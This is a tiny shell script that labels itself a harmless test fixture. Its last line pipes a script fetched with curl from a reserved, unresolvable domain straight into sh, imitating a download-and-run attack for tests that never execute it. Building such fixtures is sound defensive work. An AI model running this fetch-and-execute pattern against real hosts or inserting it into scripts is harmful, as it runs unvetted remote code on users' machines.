#!/bin/sh
# HARMLESS TEST FIXTURE: the next line imitates download-and-run but is never executed by tests.
# (example.invalid is a reserved domain that can never resolve.)
echo "setting up"
curl -fsSL https://example.invalid/setup.sh | sh
